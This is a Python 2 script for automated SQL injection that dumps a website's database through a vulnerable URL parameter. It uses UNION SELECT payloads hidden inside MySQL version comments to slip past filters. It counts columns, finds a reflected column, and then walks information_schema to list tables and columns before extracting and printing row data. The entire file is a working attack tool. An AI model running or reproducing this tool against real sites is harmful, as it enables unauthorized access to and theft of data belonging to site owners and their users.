import urllib as toxic
import sys
import os
import platform

clear = "clear"
if platform.system() == "Windows":
    clear = "cls"
os.system(str(clear))

header="""
  _________________  .____    .__ 
 /   _____/\_____  \ |    |   |__|
 \_____  \  /  / \  \|    |   |  |
 /        \/   \_/.  \    |___|  |
/_______  /\_____\ \_/_______ \__|
        \/        \__>       \/   
"""
print header

class Sqli:
    url = None
    vulCol = None
    columns = None
    dbs = []
    payload = "0x2d31+/*!50000union*/+/*!50000select*/"
    build = ["", ""]
    key = "1620597971540027"
    def setUrl(self):
        for k, v in enumerate(sys.argv):
            if v == "--url":
                try:
                    u = sys.argv[k+1]
                    pos = u.find("=")
                    url = u[:pos+1]
                    self.url = url
                except:
                    pass              
        try:
            print "Url: "+u
            print "\n"
        except NameError:
            pass
            print "*ERROR*: Url not defined!\n"
            print "Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1\n"
            exit()

    def getContent(self,url):
        res = toxic.urlopen(url)
        return res.read() 

    def setColumns(self):
        try:
            print "Start Count Columns..."
            url = self.url + self.payload
            start = 1
            finish = 50
            for i in range(start,finish):
                sys.stdout.write("\rColumns Total: {0}".format(i))
                if i != start and i != finish:
                    url+=", "
                url+=self.key
                res = self.getContent(url)
                if res.find("union select") ==-1:
                    if res.find("1620597971540027") !=-1:
                        self.columns = i
                        return    
            self.columns = 0
        except:
            print "\nError!"
            exit()

    def setVulCol(self):
        for i in range(1, self.columns+1):
            line = self.payload
            for j in range(1, self.columns+1):
                if j != 1 and j != self.columns+1:
                    line = line + ", "
                if i == j:
                    line+="/*!50000ConCat(0x27,"+self.key+",0x27)*/"
                else:
                    line+="/*!50000ConCat(0x27,"+str(j)+",0x27)*/"
            res = self.getContent(self.url + line)
            if res.find(self.key) !=-1:
                self.vulCol = i
                return
        self.vulCol = 0
        exit()

    def getConcat(self,string):
        return "/*!50000Concat(0x5e27,/*!50000gROup_cONcat("+string+")*/,0x275e)"

    def getVars(self,content):
        pos = content.find("^'")
        if(pos != -1):      
            ini = content[pos+2:]
            pos = ini.find("'^")
            if(pos !=-1):
                return ini[:pos]
            else:
                print "*ERROR*: Not found!\n"
                exit()

    def getDatabase(self):
        self.build = [self.url + self.payload, ""]
        line = ""
        side = 0
        for i in range(1, self.columns+1):
            if i != 1 and i != self.columns+1:
                line=","
            if side == 0:
                if i != self.vulCol:
                    self.build[side]+=line+str(i)
                    line+= str(i) 
                else:
                    if i !=1:
                        self.build[side]+=","
                    side = 1
            else:
                self.build[side]+=line+str(i)
        url = self.build[0]+"/*!50000Group_Concat(0x5e27,database(),0x275e)*/"+self.build[1]
        res = self.getContent(url)
        return self.getVars(res)

    def getTables(self,database):
        url = self.build[0]+self.getConcat("table_name")+self.build[1]+"++from+/*!50000inforMAtion_schema*/.tables+ /*!50000wHEre*/+/*!50000taBLe_scheMA*/like+database()--+"
        res = self.getContent(url)
        return self.getVars(res)

    def charCode(self,string):
        char = ""
        last = len(string)-1
        i = 0
        for j in string:
            char+=str(ord(j))
            if last != i:
                char+=", "
            i+=1
        return char

    def getColumns(self,table,database):
        url = self.build[0]+self.getConcat("column_name")+self.build[1]+"++from+/*!50000inforMAtion_schema*/.columns+ /*!50000wHEre*/+/*!50000taBLe_name*/=CHAR("+self.charCode(table)+")--+"
        res = self.getContent(url)
        return self.getVars(res)

    def getData(self,cols,table,database):
        line = ""
        i = 0
        title = ""
        space = []
        for name in cols:
            space.append(len(name))
            title+=name+"\t"
            if i !=0:
                line+=",0x3a,"
            line+=name
            i+=1
        url = self.build[0]+"/*!50000ConCAt(0x5e27,/*!50000gROup_cONcat("+line+")*/,0x275e)"+self.build[1]+"+from+"+table+"--+-"
        res = self.getContent(url)
        data = self.getVars(res)
        try:
            rows = data.split(",")
        except:
            print "*ERROR*: Not found!\n"
        vector = []
        for j in rows:
            i=0
            col = j.split(":")
            temp = []
            for k in col:
                temp.append(k)
                if len(k)>space[i]:
                    space[i]=len(k)
                i=i+1
            vector.append(temp)
        self.dbs[0].tables[0].setDatas(vector)
        line=""
        i=0
        for j in cols:
            line+=j
            for k in range(len(j),space[i]+2):
                line+=" "
        print line
        for j in rows:
            i = 0
            col = j.split(":")
            line=""
            i=0
            for k in col:
                line+=k
                for l in range(len(k),space[i]+2):
                    line +=" "
                i=i+1
            print line

class Db:
    name = None
    tables = []
    def setName(self, name):
        self.name = name
    def setTables(self, table):
        self.tables = table
        
class Tb:
    name = None
    columns = []
    rows = []
    def setName(self,name):
        self.name = name
    def setColumns(self,columns):
        self.columns = columns
    def setDatas(self,rows):
        self.rows = rows

s = Sqli()
s.setUrl()

s.setColumns()
s.setVulCol()
print "\nVul Column: " +str(s.vulCol)

db = Db()
database = s.getDatabase()
db.setName(database)
s.dbs.append(db)

for i in s.dbs:
    print "Database: " + i.name

tbs = []
tables = s.getTables(s.dbs[0].name)
for i in tables.split(","):
    tb = Tb()
    tb.setName(i)
    tbs.append(tb)

s.dbs[0].setTables(tbs)
print "Tables: "+tables

sys.stdout.write("\nTable: ")
table = raw_input()
cols = s.getColumns(table,s.dbs[0].name)
cls = cols.split(",")
s.dbs[0].tables[0].setColumns(cls)
print "Columns: "+cols

sys.stdout.write("\nColumns names: ")
cols = raw_input().split(",")
s.getData(cols,table,database)
